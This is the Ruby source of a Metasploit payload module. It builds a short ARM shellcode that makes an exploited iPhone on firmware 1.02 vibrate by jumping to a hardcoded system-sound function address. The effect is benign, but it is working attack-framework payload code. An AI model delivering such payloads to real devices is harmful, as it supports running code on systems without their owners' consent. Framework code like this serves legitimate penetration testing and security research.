##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 16

  include Msf::Payload::Single
  include Msf::Payload::Osx

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Apple iOS iPhone Vibrate',
      'Description'   => %q|
        Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded.
        Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.
      |,
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_ARMLE))
  end

  def generate
    [
      0xe1a00820, #  mov r0, r0, lsr #16
      0xe51ff004, #  ldr pc, [pc, #-4]
      0x319ef974, #  _AudioServicesPlaySystemSound() / Firmware 1.02
      0x03ea4444  #  Parameter: 0x03ea
    ].pack("V*")
  end
end
